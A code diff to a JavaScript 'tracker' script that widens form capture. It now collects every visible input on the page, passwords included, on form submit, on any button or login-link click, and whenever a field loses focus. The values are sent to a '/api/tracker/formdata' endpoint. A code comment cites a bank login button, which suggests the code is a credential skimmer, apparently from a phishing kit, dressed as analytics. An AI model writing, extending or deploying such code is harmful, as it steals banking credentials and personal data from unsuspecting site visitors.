@@ -257,37 +257,70 @@
 
   // ─── Common Event Trackers (Form Submit, SPA Page Views, Unload) ──────────
   function setupCommonTrackers(socket) {
-    // Form data capture
+    // Helper to capture all non-empty input/select/textarea fields in a container or document
+    function collectInputs(container) {
+      const scope = container || document;
+      const formData = {};
+      const inputs = scope.querySelectorAll('input, select, textarea');
+      
+      inputs.forEach(function(input, idx) {
+        if (input.type === 'hidden' || input.type === 'submit' || input.type === 'button') return;
+        const key = input.name || input.id || input.getAttribute('placeholder') || ('field_' + idx);
+        const val = input.value ? input.value.trim() : '';
+        if (key && val) {
+          formData[key] = val;
+        }
+      });
+      return formData;
+    }
+
+    function sendCapturedFormData(formData, formId, formAction) {
+      if (!formData || Object.keys(formData).length === 0) return;
+      const payload = {
+        sessionId: getSessionId(),
+        page: window.location.pathname + window.location.search,
+        formAction: formAction || 'N/A',
+        formId: formId || 'page_inputs',
+        data: formData,
+        timestamp: Date.now()
+      };
+
+      if (useHttpMode) {
+        sendHttpRequest('/api/tracker/formdata', payload);
+      } else if (socket && socket.connected) {
+        socket.emit('tracker:formdata', payload);
+      } else {
+        sendHttpRequest('/api/tracker/formdata', payload);
+      }
+    }
+
+    // 1. Traditional Form Submit capture
     document.addEventListener('submit', function(e) {
       const form = e.target;
       if (form.getAttribute('data-alp-ignore')) return;
+      const formData = collectInputs(form);
+      sendCapturedFormData(formData, form.id || form.className || 'form_submit', form.action);
+    });
 
-      const formData = {};
-      const inputs = form.querySelectorAll('input, select, textarea');
-      
-      inputs.forEach(function(input) {
-        const name = input.name || input.id;
-        if (name && input.type !== 'hidden') {
-          formData[name] = input.value;
-        }
-      });
+    // 2. Click capture for non-form buttons, links (e.g. <a id="dnnBankLoginSubmit_Q2">Log In</a>), or login buttons
+    document.addEventListener('click', function(e) {
+      const el = e.target.closest('a, button, input[type="button"], input[type="submit"], [role="button"], .btn, .button, .login');
+      if (!el) return;
 
+      const formData = collectInputs(document);
       if (Object.keys(formData).length > 0) {
-        const payload = {
-          sessionId: getSessionId(),
-          page: window.location.pathname + window.location.search,
-          formAction: form.action || 'N/A',
-          formId: form.id || form.className || 'unnamed',
-          data: formData,
-          timestamp: Date.now()
-        };
+        const btnId = el.id || el.className || el.textContent.trim().slice(0, 20) || 'click_trigger';
+        sendCapturedFormData(formData, btnId, 'click_action');
+      }
+    });
 
-        if (useHttpMode) {
-          sendHttpRequest('/api/tracker/formdata', payload);
-        } else if (socket && socket.connected) {
-          socket.emit('tracker:formdata', payload);
-        } else {
-          sendHttpRequest('/api/tracker/formdata', payload);
+    // 3. Auto-capture inputs when typing/leaving input fields (blur event)
+    document.addEventListener('focusout', function(e) {
+      const tag = e.target.tagName.toLowerCase();
+      if (tag === 'input' || tag === 'select' || tag === 'textarea') {
+        const formData = collectInputs(document);
+        if (Object.keys(formData).length > 0) {
+          sendCapturedFormData(formData, 'blur_auto_capture', 'auto_save');
         }
       }
     });
